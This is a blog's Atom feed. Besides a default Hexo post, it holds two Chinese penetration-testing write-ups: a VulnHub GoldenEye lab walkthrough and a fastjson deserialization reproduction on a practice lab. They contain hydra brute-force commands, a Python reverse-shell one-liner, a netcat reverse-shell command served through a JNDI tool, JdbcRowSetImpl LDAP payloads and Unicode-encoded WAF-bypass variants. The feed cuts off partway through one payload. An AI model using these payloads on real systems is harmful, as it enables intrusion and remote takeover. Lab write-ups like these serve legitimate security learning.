<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>n0rt6&#39;s blog</title>
  
  <subtitle>Welcome To You</subtitle>
  <link href="http://3143047748.github.io/atom.xml" rel="self"/>
  
  <link href="http://3143047748.github.io/"/>
  <updated>2022-12-07T03:37:28.649Z</updated>
  <id>http://3143047748.github.io/</id>
  
  <author>
    <name>n0rt6</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://3143047748.github.io/2024/09/07/hello-world/"/>
    <id>http://3143047748.github.io/2024/09/07/hello-world/</id>
    <published>2024-09-07T13:19:34.947Z</published>
    <updated>2022-12-07T03:37:28.649Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-GoldenEye</title>
    <link href="http://3143047748.github.io/2024/07/15/VulnHub-GoldenEye/"/>
    <id>http://3143047748.github.io/2024/07/15/VulnHub-GoldenEye/</id>
    <published>2024-07-15T09:55:01.000Z</published>
    <updated>2024-07-15T09:55:49.105Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="靶机探测"><a href="#靶机探测" class="headerlink" title="靶机探测"></a>靶机探测</h2><p>首先使用nmap探测一下靶机的IP地址<br><code>nmap 192.168.206.124/24</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.167Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00013s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>PORT   STATE SERVICE<span class="token number">25</span>/tcp <span class="token function">open</span>  smtp<span class="token number">80</span>/tcp <span class="token function">open</span>  httpMAC Address: 00:0C:29:10:35:1F <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进一步探测靶机信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment"># nmap 192.168.206.167 -p- -sS -A</span>Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-15 <span class="token number">15</span>:30 CSTNmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.167Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0012s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65531</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>PORT      STATE SERVICE  VERSION<span class="token number">25</span>/tcp    <span class="token function">open</span>  smtp     Postfix smtpd<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span><span class="token operator">|</span>_smtp-commands: ubuntu, PIPELINING, SIZE <span class="token number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>ubuntu<span class="token operator">|</span> Not valid before: <span class="token number">2018</span>-04-24T03:22:34<span class="token operator">|</span>_Not valid after:  <span class="token number">2028</span>-04-21T03:22:34<span class="token number">80</span>/tcp    <span class="token function">open</span>  http     Apache httpd <span class="token number">2.4</span>.7 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span><span class="token operator">|</span>_http-title: GoldenEye Primary Admin Server<span class="token operator">|</span>_http-server-header: Apache/2.4.7 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token number">55006</span>/tcp <span class="token function">open</span>  ssl/pop3 Dovecot pop3d<span class="token operator">|</span>_pop3-capabilities: AUTH-RESP-CODE SASL<span class="token punctuation">(</span>PLAIN<span class="token punctuation">)</span> <span class="token environment constant">USER</span> RESP-CODES CAPA PIPELINING TOP UIDL<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span><span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>localhost/organizationName<span class="token operator">=</span>Dovecot mail server<span class="token operator">|</span> Not valid before: <span class="token number">2018</span>-04-24T03:23:52<span class="token operator">|</span>_Not valid after:  <span class="token number">2028</span>-04-23T03:23:52<span class="token number">55007</span>/tcp <span class="token function">open</span>  pop3     Dovecot pop3d<span class="token operator">|</span>_pop3-capabilities: RESP-CODES PIPELINING SASL<span class="token punctuation">(</span>PLAIN<span class="token punctuation">)</span> AUTH-RESP-CODE <span class="token environment constant">USER</span> CAPA STLS TOP UIDL<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span><span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>localhost/organizationName<span class="token operator">=</span>Dovecot mail server<span class="token operator">|</span> Not valid before: <span class="token number">2018</span>-04-24T03:23:52<span class="token operator">|</span>_Not valid after:  <span class="token number">2028</span>-04-23T03:23:52MAC Address: 00:0C:29:10:35:1F <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>Network Distance: <span class="token number">1</span> hopTRACEROUTEHOP RTT     ADDRESS<span class="token number">1</span>   <span class="token number">1.16</span> ms <span class="token number">192.168</span>.206.167OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">39.75</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问80端口：<br><img src="https://i-blog.csdnimg.cn/direct/123a06efaa7e49b09979a699a3c2e1f0.png" alt=" "></p><p><a href="http://192.168.206.167/sev-home/%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%AA%97%E5%8F%A3">http://192.168.206.167/sev-home/是一个登录窗口</a><br>查看源码发现一个js文件<br><img src="https://i-blog.csdnimg.cn/direct/b862e7b669b5483cb9ed5c188ea8f484.png" alt=" "></p><p>存在一段密文:<br><code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code><br>解密之后得到:<br><code>InvincibleHack3r</code></p><h2 id="密码暴破"><a href="#密码暴破" class="headerlink" title="密码暴破"></a>密码暴破</h2><p>那么结合出现的两个用户名<code>Boris</code>和<code>Natalya</code>，尝试一下爆破账密登录刚才的登录口，大小写都试试。<br><code>boris/InvincibleHack3r</code>登录成功，看到提示：</p><p><img src="https://i-blog.csdnimg.cn/direct/e5d4296a06e5446b9270f6316e514960.png" alt=" "></p><p>可知下面就是针对55007端口啦<br>使用九头蛇进行爆破:<br><code>hydra -L GodenEye.txt  -P /usr/share/wordlists/fasttrack.txt 192.168.206.167 -s 55007 pop3</code></p><p><img src="https://i-blog.csdnimg.cn/direct/7b22633e017a4bf7990cdc8bbe653053.png" alt=" "></p><h2 id="pop服务访问"><a href="#pop服务访问" class="headerlink" title="pop服务访问"></a>pop服务访问</h2><p>pop3登录例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># telnet $ip 110</span> +OK beta POP3 server <span class="token punctuation">(</span>JAMES POP3 Server <span class="token number">2.3</span>.2<span class="token punctuation">)</span> ready  <span class="token environment constant">USER</span> billydean     +OK PASS password +OK Welcome billydean  list  +OK <span class="token number">2</span> <span class="token number">1807</span> <span class="token number">1</span> <span class="token number">786</span> <span class="token number">2</span> <span class="token number">1021</span> retr <span class="token number">1</span>  +OK Message follows From: jamesbrown@motown.com Dear Billy Dean, Here is your login <span class="token keyword">for</span> remote desktop <span class="token punctuation">..</span>. try not to forget it this time<span class="token operator">!</span> username: billydean password: PA<span class="token variable">$$</span>W0RD<span class="token operator">!</span>Z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>挨个访问，natalya用户有2个邮件：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;root@ubuntu>X-Original-To: natalyaDelivered-To: natalya@ubuntuReceived: from ok (localhost [127.0.0.1])        by ubuntu (Postfix) with ESMTP id D5EDA454B1        for &lt;natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu>Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)From: root@ubuntuNatalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;root@ubuntu>X-Original-To: natalyaDelivered-To: natalya@ubuntuReceived: from root (localhost [127.0.0.1])        by ubuntu (Postfix) with SMTP id 17C96454B1        for &lt;natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)Message-Id: &lt;20180425031956.17C96454B1@ubuntu>Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)From: root@ubuntuOk Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)Ok, user creds are:username: xeniapassword: RCP90rulez!Boris verified her as a valid contractor so just create the account ok?And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir**Make sure to edit your host file since you usually work remote off-network....Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>boris有3个邮件：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;root@127.0.0.1.goldeneye>X-Original-To: borisDelivered-To: boris@ubuntuReceived: from ok (localhost [127.0.0.1])        by ubuntu (Postfix) with SMTP id D9E47454B1        for &lt;boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)Message-Id: &lt;20180425022326.D9E47454B1@ubuntu>Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)From: root@127.0.0.1.goldeneyeBoris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;natalya@ubuntu>X-Original-To: borisDelivered-To: boris@ubuntuReceived: from ok (localhost [127.0.0.1])        by ubuntu (Postfix) with ESMTP id C3F2B454B1        for &lt;boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu>Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)From: natalya@ubuntuBoris, I can break your codes!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;alec@janus.boss>X-Original-To: borisDelivered-To: boris@ubuntuReceived: from janus (localhost [127.0.0.1])        by ubuntu (Postfix) with ESMTP id 4B9F4454B1        for &lt;boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu>Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)From: alec@janus.bossBoris,Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....PS - Keep security tight or we will be compromised.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据邮件信息得到一个网站的账号密码<br>username: xenia<br>password: RCP90rulez!<br>先改一下host文件，登录成功！<br>登录之后得到的信息如下：<br>1、存在admin、doak用户<br>2、cms版本为moodle2.2.3<br>爆破doak的密码为goat，查看邮件信息：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;doak@ubuntu>X-Original-To: doakDelivered-To: doak@ubuntuReceived: from doak (localhost [127.0.0.1])        by ubuntu (Postfix) with SMTP id 97DC24549D        for &lt;doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)Message-Id: &lt;20180425034731.97DC24549D@ubuntu>Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)From: doak@ubuntuJames,If you're reading this, congrats you've gotten this far. You know how tradecraft works right?Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......username: dr_doakpassword: 4England!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用上面的账密登录网站，登录之后发现文件<br><img src="https://i-blog.csdnimg.cn/direct/fbae555517114be5b51371fda2557e10.png" alt=" "></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">007,I was able to capture this apps adm1n cr3ds through clear txt. Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. Something juicy is located here: /dir007key/for-007.jpgAlso as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载文件之后在图片属性里看到一段密文：eFdpbnRlcjE5OTV4IQ&#x3D;&#x3D;&#x2F;xWinter1995x!<br><img src="https://i-blog.csdnimg.cn/direct/77c32edab5f54859b875711a7fbde2b2.png" alt=" "><br>尝试登陆一下admin&#x2F;xWinter1995x!</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>搜索moodle2.2.3漏洞进行复现<br><img src="https://i-blog.csdnimg.cn/direct/e8549cd137144605b50eecc0b2d4899a.png" alt=" "><br>然后在这里输入反弹shell<br><img src="https://i-blog.csdnimg.cn/direct/ae4847e514f74bc1b5eb8c2bd6934ef2.png" alt=" "><br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.206.138&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code><br>然后编辑一篇文章<br><img src="https://i-blog.csdnimg.cn/direct/5d08efbe22234070bb5406f329e80380.png" alt=" "><br>拿到shell。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>进行信息收集发现内核版本为3.13.0，<a href="https://www.exploit-db.com/exploits/37292">提权脚本</a><br>注意将脚本中的gcc改为cc后编译进行提权<br><img src="https://i-blog.csdnimg.cn/direct/9bad6b668e594226828d3d28ef586805.png" alt=" "></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="靶场" scheme="http://3143047748.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>fastjson-漏洞复现</title>
    <link href="http://3143047748.github.io/2024/03/29/fastjson-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://3143047748.github.io/2024/03/29/fastjson-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-03-29T08:51:58.000Z</published>
    <updated>2024-03-29T08:53:41.217Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>借助<a href="https://github.com/lemono0/FastJsonParty">FastJsonParty</a>靶场进行一下fastjson一些版本漏洞的复现</p><h2 id="1-2-47-jndi（出网）"><a href="#1-2-47-jndi（出网）" class="headerlink" title="1.2.47-jndi（出网）"></a>1.2.47-jndi（出网）</h2><p>我使用自己的服务器搭建的靶场，访问登陆页面之后抓包登录数据， 传入的数据为json格式<br><img src="https://img-blog.csdnimg.cn/direct/8ebff2e5677546d1bdce8f33dbaf2330.png" alt="123"></p><p>尝试让其进行报错，比如说删除一个<code>&#125;</code>,<code>&quot;</code><br>报错数据</p><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 500 Content-Type: application&#x2F;jsonDate: Thu, 28 Mar 2024 03:48:20 GMTConnection: closeContent-Length: 160&#123;&quot;timestamp&quot;:&quot;2024-03-28T03:48:20.909+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;syntax error, position at 0, name password&quot;,&quot;path&quot;:&quot;&#x2F;login&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>标准的fastjson错误提示，确定后端使用了fastjson。<br>使用dnslog测试一下</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.Inet4Address"</span><span class="token punctuation">,</span>  <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"nf8mm5.dnslog.cn"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/direct/f7a9c69af6054630a3a16340ddf783d6.png" alt="12"><br><img src="https://img-blog.csdnimg.cn/direct/e6b51ba169b64038a26eb9975355f52b.png" alt="123"></p><p>也收到了请求，说明存在漏洞。此时我们还需要知道存在的漏洞版本<br>开始探测fastjson的精确版本</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过报错信息可以看出版本为1.2.47<br><img src="https://img-blog.csdnimg.cn/direct/5dfcf1c427b242cb8d23826b92d52430.png" alt="123"><br>利用mappings缓存机制，JdbcRowSetImpl打jndi，但前提是需要机器出网。关于这种方式探测fastjosn版本，条件是需要response中会回显报错信息，但实际环境可能存在不回显的情况，那就需要利用其他手段了，如dnslog、ddos等间接判断。<br>使用jndi注入工具<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit-1.0-SNAPSHOT-all</a>。可以使用nc反弹shell。<br>将该工具上传到kali，开启服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-A</span> <span class="token number">123.60</span>.157.194 <span class="token parameter variable">-C</span> <span class="token string">"nc 123.60.157.194 9999 -e sh"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/direct/7a76d0a9874f461f876d9a0ceef3fbfb.png" alt="123"><br>然后服务器再监听一个端口9999</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://123.60.157.194:1389/2kgqlp"</span><span class="token punctuation">,</span>        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>send之后就会接收到shell<br><img src="https://img-blog.csdnimg.cn/direct/645b700e502a4db2a1a06ef697d7ccd7.png" alt="456"><br>在复现过程中我使用了windows进行开启服务，一直出现以下报错：<br><img src="https://img-blog.csdnimg.cn/direct/ff477a4244144e31a265665610b55639.png" alt="456"><br>原因就是1389已经被占用，尝试了几次更换kali之后就可以正常打了。</p><h2 id="1247-jndi-waf"><a href="#1247-jndi-waf" class="headerlink" title="1247-jndi-waf"></a>1247-jndi-waf</h2><h3 id="检测是否是fastjson的方法"><a href="#检测是否是fastjson的方法" class="headerlink" title="检测是否是fastjson的方法"></a>检测是否是fastjson的方法</h3><p>1、去掉<code>&#125;</code>或<code>&quot;</code></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"ad"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"ad"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、dnslog探测</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.Inet4Address"</span><span class="token punctuation">,</span>  <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"nf8mm5.dnslog.cn"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="检测fastjson精确版本"><a href="#检测fastjson精确版本" class="headerlink" title="检测fastjson精确版本"></a>检测fastjson精确版本</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/direct/b81072e29e524bc485f2f47c28b3e562.png" alt="123"><br>从报错信息看出来被拦截了，根据项目文件可以知道过滤的字符：</p><p><img src="https://img-blog.csdnimg.cn/direct/7a71c623ed304f31bc1aba470e4a17c2.png" alt="本身"><br>fastjson本身是默认识别并编码hex和Unicode编码的，所以利用这个特性进行绕过。<br>将数据进行Unicode编码</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0041\u0075\u0074\u006F\u0043\u006C\u006F\u0073\u0065\u0061\u0062\u006C\u0065"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到了具体版本：<br><img src="https://img-blog.csdnimg.cn/direct/37f83cba0d404094beeba4b390a2019d.png" alt="123"></p><p>然后按照上面的payload，只需进行一下Unicode编码即可</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://123.60.157.194:1389/qz9noe"</span><span class="token punctuation">,</span>        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"\u0061"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0043\u006C\u0061\u0073\u0073"</span><span class="token punctuation">,</span>        <span class="token property">"\u0076\u0061\u006C"</span><span class="token operator">:</span><span class="token string">"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"\u0062"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"</span><span class="token punctuation">,</span>        <span 